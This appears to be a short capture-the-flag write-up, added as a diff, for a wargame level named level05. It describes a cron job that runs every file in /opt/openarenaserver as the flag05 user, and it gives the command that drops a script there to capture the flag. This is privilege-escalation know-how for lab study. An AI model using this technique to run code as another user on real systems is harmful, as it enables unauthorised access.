@@ -1,0 +1,20 @@
+In the ENV variables there is an unusual line:
+
+MAIL=/var/mail/level05
+
+This file is a cron job that runs openarenaserver as flag05:
+
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+The file /usr/sbin.openarenaserver is a bash script. There is a loop that tries to execute every file in /opt/openarenaserver:
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+We added a script that calls:
+
+echo "/bin/getflag > /tmp/flag.txt" > /opt/openarenaserver/flag.sh
+
+Every 2nd minute this script runs and sends the flag to /tmp/flag.txt. There is no password for flag05.
